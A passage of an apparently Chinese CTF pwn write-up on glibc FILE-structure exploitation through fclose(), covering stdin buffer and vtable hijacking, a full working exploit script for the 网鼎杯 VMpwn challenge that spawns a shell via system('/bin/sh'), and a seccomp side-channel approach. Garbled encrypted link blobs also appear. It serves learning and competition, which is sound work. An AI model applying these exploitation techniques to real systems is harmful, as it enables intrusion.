
<mark class="encrypted">0c2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1k6h3q4E0M7X3!0U0K9$3g2@1K9i4y4@1i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1j5J5x3o6t1H3i4K6u0r3x3o6u0Q4x3V1j5H3y4g2)9J5c8W2m8%4L8W2)9J5k6p5S2S2j5$3E0f1e0g2)9J5k6o6t1H3x3U0m8Q4x3X3c8f1M7X3W2H3i4K6u0V1g2r3!0Q4x3X3c8f1M7X3W2U0K9#2)9J5c8W2!0q4z5q4!0n7c8W2)9&6z5g2!0q4y4q4!0n7z5q4!0m8b7g2!0q4y4g2)9^5c8q4)9&6b7g2!0q4y4g2!0m8c8g2!0m8x3W2!0q4z5q4!0m8c8g2!0n7x3q4!0q4y4g2!0n7c8q4)9&6y4g2!0q4y4q4!0n7b7g2)9^5y4W2!0q4z5q4!0m8c8W2!0m8y4W2!0q4y4#2!0n7b7W2)9^5y4W2!0q4y4#2)9&6b7g2)9^5y4q4!0q4z5q4!0m8y4#2!0m8x3#2!0q4z5g2!0m8x3W2)9&6z5q4!0q4z5q4!0n7c8W2)9^5y4#2!0q4y4#2!0m8z5q4)9^5b7W2!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4#2)9&6b7#2)9^5b7W2!0q4y4q4!0n7b7g2)9^5y4W2!0q4y4q4!0n7z5g2)9^5b7W2!0q4y4g2)9&6x3q4)9^5c8g2!0q4y4g2)9^5c8W2)9&6y4#2!0q4y4#2)9&6b7W2)9^5b7g2!0q4y4g2!0n7c8g2)9^5z5q4!0q4y4g2!0m8y4q4)9&6b7g2!0q4c8W2!0n7b7#2)9^5b7#2!0q4z5q4)9^5x3q4)9^5x3#2!0q4y4W2)9&6c8W2!0m8y4g2!0q4y4#2)9^5x3W2!0n7z5g2!0q4y4q4!0n7z5q4!0n7b7W2!0q4z5q4!0m8y4W2)9^5x3g2!0q4y4W2)9&6z5q4!0m8c8X3k6U0L8r3!0K6k6g2)9J5z5q4)9J5z5g2!0q4y4g2)9^5y4#2!0n7c8q4!0q4y4W2)9&6y4g2!0n7x3q4!0q4z5q4!0m8y4#2!0m8y4W2!0q4y4g2)9^5c8W2)9&6x3g2!0q4y4#2)9&6b7g2)9^5y4q4!0q4y4#2!0m8z5q4)9^5b7W2!0q4y4g2!0n7b7g2)9^5c8W2!0q4y4W2!0n7y4g2)9^5x3g2!0q4y4g2)9^5b7g2!0m8b7W2!0q4y4W2)9^5b7#2)9^5x3g2!0q4x3#2)9^5x3q4)9^5x3R3`.`.</mark>

本题目是可以修改`vtable`的值，利用`fclose()`控制程序流主要是如下源码：

```c
int
\_IO\_new\_fclose (FILE \*fp)
{
int status;
CHECK\_FILE(fp, EOF);
#if SHLIB\_COMPAT (libc, GLIBC\_2\_0, GLIBC\_2\_1)
/\* We desperately try to help programs which are using streams in a
strange way and mix old and new functions. Detect old streams
here. \*/
if (\_IO\_vtable\_offset (fp) != 0)
return \_IO\_old\_fclose (fp);
#endif
/\* First unlink the stream. \*/
if (fp->\_flags & \_IO\_IS\_FILEBUF)
\_IO\_un\_link ((struct \_IO\_FILE\_plus \*) fp);
\_IO\_acquire\_lock (fp);
if (fp->\_flags & \_IO\_IS\_FILEBUF)
status = \_IO\_file\_close\_it (fp);
else
status = fp->\_flags & \_IO\_ERR\_SEEN ? -1 : 0;
\_IO\_release\_lock (fp);
\_IO\_FINISH (fp); -------------------------------------------------------此处开始劫持程序流
if (fp->\_mode > 0)
{
/\* This stream has a wide orientation. This means we have to free
the conversion functions. \*/
struct \_IO\_codecvt \*cc = fp->\_codecvt;
\_\_libc\_lock\_lock (\_\_gconv\_lock);
\_\_gconv\_release\_step (cc->\_\_cd\_in.\_\_cd.\_\_steps);
\_\_gconv\_release\_step (cc->\_\_cd\_out.\_\_cd.\_\_steps);
\_\_libc\_lock\_unlock (\_\_gconv\_lock);
}
else
{
if (\_IO\_have\_backup (fp))
\_IO\_free\_backup\_area (fp);
}
if (fp != \_IO\_stdin && fp != \_IO\_stdout && fp != \_IO\_stderr)
{
fp->\_flags = 0;
free(fp);
}
return status;
}
```

当调用`setbuf`关闭缓冲区之后，再次输入的时候将不会在heap区域分配空间当做缓冲区，其中`IO_buf_base`指向的是缓冲区起点，`IO_buf_end`指向的是缓冲区终点，关闭缓冲区之后，`IO_buf_base`指向`_IO_2_1_stdin_->shortbuf`，位于`stdin`内部，保存`\n`或者`\0`，`IO_buf_end=IO_buf_base+1`。

我们修改`_IO_2_1_stdin_->IO_buf_end`，使其增大之后，便可以控制此缓冲区内部的内容，即输入时的内容都会先存储在当前的缓冲区内（libc空间）。

我最初还有一个疑问是，`scanf("%llx %llx"，&v4,&v5)`正常来说是输入两个64位十六进制整数，在第二次输入时输入了长度很长的payload，不按照正常输入可以输入进去么？ 经过程序测试的结果是，他会将输入的所有字符串先缓存在缓冲区内，然后按照格式解析给`v4`,`v5`，所以我们的payload是可以正常覆盖到libc上的。

解题思路：

1. 修改`_IO_2_1_stdin->_IO_buf_end`，增大其值导致可以覆盖libc空间内容
2. 修改`_IO_2_1_stdout->vtable`值，并且伪造`fake_table->__finish`函数地址为`setcontext+0x35`，同时布置好orw的ROP链
3. `fclose(stdout)`触发ROP链，进行orw获得shell

## 四、网鼎杯--VMpwn

之所以介绍这道题目，是因为这道题目最后的get shell方式也是通过`fclose()`函数，本题目不可以在libc段写，但是可以再bss段写，我们可以在bss段伪造`stderr`，然后利用`fclose(stderr)`获得shell。

由于是伪造`stderr`，所以不同于上题目中利用`_IO_FINISH (fp);`来控制程序流，我们控制程序流的位置要稍微靠前一下,否则还要保证之前的功能可以正常，劫持程序流位置如下：

```c
int
\_IO\_new\_fclose (FILE \*fp)
{
int status;
CHECK\_FILE(fp, EOF);
#if SHLIB\_COMPAT (libc, GLIBC\_2\_0, GLIBC\_2\_1)
/\* We desperately try to help programs which are using streams in a
strange way and mix old and new functions. Detect old streams
here. \*/
if (\_IO\_vtable\_offset (fp) != 0)
return \_IO\_old\_fclose (fp);
#endif
/\* First unlink the stream. \*/
if (fp->\_flags & \_IO\_IS\_FILEBUF)
\_IO\_un\_link ((struct \_IO\_FILE\_plus \*) fp);
\_IO\_acquire\_lock (fp);
if (fp->\_flags & \_IO\_IS\_FILEBUF)
status = \_IO\_file\_close\_it (fp); -------------------------------------------------------此处开始劫持程序流
else
status = fp->\_flags & \_IO\_ERR\_SEEN ? -1 : 0;
\_IO\_release\_lock (fp);
\_IO\_FINISH (fp);
if (fp->\_mode > 0)
{
/\* This stream has a wide orientation. This means we have to free
the conversion functions. \*/
struct \_IO\_codecvt \*cc = fp->\_codecvt;
\_\_libc\_lock\_lock (\_\_gconv\_lock);
\_\_gconv\_release\_step (cc->\_\_cd\_in.\_\_cd.\_\_steps);
\_\_gconv\_release\_step (cc->\_\_cd\_out.\_\_cd.\_\_steps);
\_\_libc\_lock\_unlock (\_\_gconv\_lock);
}
else
{
if (\_IO\_have\_backup (fp))
\_IO\_free\_backup\_area (fp);
}
if (fp != \_IO\_stdin && fp != \_IO\_stdout && fp != \_IO\_stderr)
{
fp->\_flags = 0;
free(fp);
}
return status;
}
```

贴一下exp，感兴趣的可以自己去调试一下

```python
#! /usr/bin/env python
# -\*- coding: utf-8 -\*-
from PwnContext import \*
if \_\_name\_\_ == '\_\_main\_\_':
#context.terminal = ['tmux', 'split', '-h']
#-----function for quick script-----#
s = lambda data :ctx.send(str(data)) #in case that data is a int
sa = lambda delim,data :ctx.sendafter(str(delim), str(data))
sl = lambda data :ctx.sendline(str(data))
sla = lambda delim,data :ctx.sendlineafter(str(delim), str(data))
r = lambda numb=4096 :ctx.recv(numb)
ru = lambda delims, drop=True :ctx.recvuntil(delims, drop)
irt = lambda :ctx.interactive()
rs = lambda \*args, \*\*kwargs :ctx.start(\*args, \*\*kwargs)
leak = lambda address, count=0 :ctx.leak(address, count)
uu32 = lambda data :u32(data.ljust(4, '\0'))
uu64 = lambda data :u64(data.ljust(8, '\0'))
debugg = 1
logg = 1
ctx.binary = './vm\_pwn'
ctx.custom\_lib\_dir = './glibc-all-in-one/libs/2.23-0ubuntu10\_amd64/'#remote libc
ctx.debug\_remote\_libc = True
ctx.symbols = {'fake':0x202060}
ctx.breakpoints = [0xfd6,0xc50]
#ctx.debug()
#ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
if debugg:
rs()
else:
ctx.remote = ('localhost', 1234)
rs(method = 'remote')
if logg:
context.log\_level = 'debug'
n\_7 = '\x5d'
n\_5 = '\x2c'
n\_3 = '\x2d'
n\_2 = '\x2b'
n\_1 = '\x3e'
n\_4 = '\x2e'
n\_6 = '\x5b'
n\_8 = '\x00'
n\_9 = '\x01'
n\_0 = '\x3c'
#ctx.debug()
#raw\_input()
sla('name','AAAA')
sla('>>>','1')
payload = n\_0\*0x20 + n\_6 + n\_4 + (n\_1 + n\_4)\*5#leak libc
payload += n\_0\*(0x38+0xd-8) + n\_4 + (n\_1 + n\_4)\*5#leak proc\_bass
sa('task:',len(payload))
sa('Task:\n',payload)
libc\_base = uu64(r(6)) - 0x3c5540
log.success("libc\_base = %#x"%libc\_base)
text\_base = uu64(r(6)) - 0x202008
log.success("text\_base = %#x"%text\_base)
sla('>>>','1')
#ctx.debug()
#raw\_input()
libc = ctx.libc
system = libc\_base + libc.sym['system']
payload\_base = text\_base + 0x202060
payload = ''
payload += n\_5 + (n\_1 + n\_5) \* 6 + n\_1\*2
payload += n\_1 \* 0x80 + n\_5 + (n\_1 + n\_5) \* 5 + n\_1\*3
payload += n\_1 \* 0x48 + n\_5 + (n\_1 + n\_5) \* 5 + n\_1\*3
payload += n\_5 + (n\_1 + n\_5) \* 5 + n\_1\*3
payload += n\_0 \* 0x108 + n\_6 + n\_5 + (n\_1 + n\_5) \* 5
sa('task:',len(payload))
sa('Task:\n',payload)
s('/bin/sh')
s(p64(payload\_base+0x100)[:6])
s(p64(payload\_base+0xe0-0x88)[:6])#fake vtable
s(p64(system)[:6])#vtable func
s(p64(payload\_base)[:6])#change stderr
sla('>>>','2')
#ctx.debug(gdbscript='directory /mnt/hgfs/vm\_share/glibc-source/glibc-2.23/libio/')
irt()
```

## 五、obey_the_rules

题目进行了seccomp限制，但是rules未知，需要首先编写shellcode进行探测

得知seccomp限制条件如下

只允许`read` `open` 并且`open`的`fd=3`时，对于buffer值进行了规定，因此需要两次`open`，使得`fd`值为4

解题思路是第一步利用shellcode进一步扩大shellcode空间，可以输入更多的shellcode;然后利用侧信道攻击，将flag内容读取到内存中，然后利用汇编指令进行遍历比对，最终得到flag。

详见博客：<mark class="encrypted">d1cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5x3$3u0A6L8r3I4A6L8$3&6K6i4K6u0W2j5$3!0E0i4K6u0r3N6%4u0A6N6r3g2#2M7q4)9J5k6r3!0T1k6i4W2Q4x3X3c8@1K9r3g2Q4x3X3c8J5N6h3I4W2M7#2)9J5c8R3`.`.</mark>

# 2020-HackTM-CTF

## 一、twisty

### 1. 程序分析与漏洞定位

程序的功能是一个4\*4的“rubik's square”游戏，有一个0x10大小的叫做`__m128i`的结构体。
